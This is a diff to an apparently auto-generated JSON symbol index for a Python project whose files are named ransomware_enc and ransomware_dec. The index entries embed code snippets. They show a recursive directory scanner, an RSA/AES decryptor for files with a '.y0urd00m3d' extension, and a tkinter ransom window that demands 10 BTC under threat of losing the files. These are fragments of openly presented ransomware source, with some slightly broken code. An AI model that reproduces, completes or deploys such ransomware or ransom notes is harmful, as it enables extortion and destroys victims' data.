@@ -25,6 +25,14 @@
         "documentation": {}
     },
     {
+        "label": "RSA",
+        "importPath": "Crypto.PublicKey",
+        "description": "Crypto.PublicKey",
+        "isExtraImport": true,
+        "detail": "Crypto.PublicKey",
+        "documentation": {}
+    },
+    {
         "label": "os",
         "kind": 6,
         "isExtraImport": true,
@@ -34,12 +42,11 @@
         "documentation": {}
     },
     {
-        "label": "tkinter",
-        "kind": 6,
+        "label": "Path",
+        "importPath": "pathlib",
+        "description": "pathlib",
         "isExtraImport": true,
-        "importPath": "tkinter",
-        "description": "tkinter",
-        "detail": "tkinter",
+        "detail": "pathlib",
         "documentation": {}
     },
     {
@@ -48,6 +55,31 @@
         "description": "pathlib",
         "isExtraImport": true,
         "detail": "pathlib",
+        "documentation": {}
+    },
+    {
+        "label": "PKCS1_OAEP",
+        "importPath": "Crypto.cipher",
+        "description": "Crypto.cipher",
+        "isExtraImport": true,
+        "detail": "Crypto.cipher",
+        "documentation": {}
+    },
+    {
+        "label": "AES",
+        "importPath": "Crypto.cipher",
+        "description": "Crypto.cipher",
+        "isExtraImport": true,
+        "detail": "Crypto.cipher",
+        "documentation": {}
+    },
+    {
+        "label": "tkinter",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "tkinter",
+        "description": "tkinter",
+        "detail": "tkinter",
         "documentation": {}
     },
     {
@@ -91,6 +123,60 @@
         "description": "generatePrivate_Public_KEY",
         "peekOfCode": "publicKey = key.publickey().export_key()\n#\nwith open('private.pem', 'wb') as f:\n    f.write(privateKey)\nwith open('public.pem', 'wb') as f:\n    f.write(publicKey)\nprint('Private key saved to private.pem')\nprint('Private key saved to public.pem')\nprint('Done')",
         "detail": "generatePrivate_Public_KEY",
+        "documentation": {}
+    },
+    {
+        "label": "scanRecurse",
+        "kind": 2,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "def scanRecurse(baseDir):\n        for entry in os.scandir(baseDir):\n            if entry.is_file():\n                yield entry\n            else:\n                yield from scanRecurse(entry.path)\ndef decrypt(dataFile, privateKeyFile):\n        #read private key fom file\n        extension = dataFile.suffix.lower()\n        with open(privateKeyFile, 'rb') as f:",
+        "detail": "ransomware_dec",
+        "documentation": {}
+    },
+    {
+        "label": "decrypt",
+        "kind": 2,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "def decrypt(dataFile, privateKeyFile):\n        #read private key fom file\n        extension = dataFile.suffix.lower()\n        with open(privateKeyFile, 'rb') as f:\n            privateKey = f.read()\n        # create private key object\n        key = RSA.import_key(privateKey)\n       #read data from file\nwith open (dataFile, 'rb') as f:\n        # read the session key",
+        "detail": "ransomware_dec",
+        "documentation": {}
+    },
+    {
+        "label": "privateKeyFile",
+        "kind": 5,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "privateKeyFile = 'private.pem'\ndef scanRecurse(baseDir):\n        for entry in os.scandir(baseDir):\n            if entry.is_file():\n                yield entry\n            else:\n                yield from scanRecurse(entry.path)\ndef decrypt(dataFile, privateKeyFile):\n        #read private key fom file\n        extension = dataFile.suffix.lower()",
+        "detail": "ransomware_dec",
+        "documentation": {}
+    },
+    {
+        "label": "directory",
+        "kind": 5,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "directory = './' #change this\ndir = input ('put your directory (default is \"./\"):')\nif dir:\n            directory = dir\nincludeExtension = ['.y0urd00m3d']#all lower case characters\nfor item in scanRecurse(directory):\n    filePath = Path(item)\n    fileType = filePath.suffix.lower()\n# run the decrytor just the extension is the on that I mention\n    if fileType in includeExtension:",
+        "detail": "ransomware_dec",
+        "documentation": {}
+    },
+    {
+        "label": "dir",
+        "kind": 5,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "dir = input ('put your directory (default is \"./\"):')\nif dir:\n            directory = dir\nincludeExtension = ['.y0urd00m3d']#all lower case characters\nfor item in scanRecurse(directory):\n    filePath = Path(item)\n    fileType = filePath.suffix.lower()\n# run the decrytor just the extension is the on that I mention\n    if fileType in includeExtension:\n        decrypt(filePath, privateKeyFile)",
+        "detail": "ransomware_dec",
+        "documentation": {}
+    },
+    {
+        "label": "includeExtension",
+        "kind": 5,
+        "importPath": "ransomware_dec",
+        "description": "ransomware_dec",
+        "peekOfCode": "includeExtension = ['.y0urd00m3d']#all lower case characters\nfor item in scanRecurse(directory):\n    filePath = Path(item)\n    fileType = filePath.suffix.lower()\n# run the decrytor just the extension is the on that I mention\n    if fileType in includeExtension:\n        decrypt(filePath, privateKeyFile)",
+        "detail": "ransomware_dec",
         "documentation": {}
     },
     {
@@ -143,7 +229,7 @@
         "kind": 5,
         "importPath": "ransomware_enc",
         "description": "ransomware_enc",
-        "peekOfCode": "root = tk.Tk()\nroot.title('ToriPlop Ransomware')\nroot.geometry('500x300')\nroot.resizable(False, False)\nlabel1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\\nto unlock them !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel1.pack()\nlabel = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')\nlabel.pack()\nlabel2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()",
+        "peekOfCode": "root = tk.Tk()\nroot.title('y0uRD00m3d Ransomware')\nroot.geometry('500x300')\nroot.resizable(False, False)\nlabel1 = tk.Label(root, text = 'You data is encrypted, pay me 10 BTCs,\\nto unlock them !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel1.pack()\nlabel = tk.Label(root, font=('calibri',50, 'bold'), fg = 'with', bg =  'red')\nlabel.pack()\nlabel2 = tk.Label(root, text = '\\n\\n If the time runs out your file\\nwill be gone !!!\\n\\n', font=('calibri', 12, 'bold'))\nlabel2.pack()",
         "detail": "ransomware_enc",
         "documentation": {}
     },
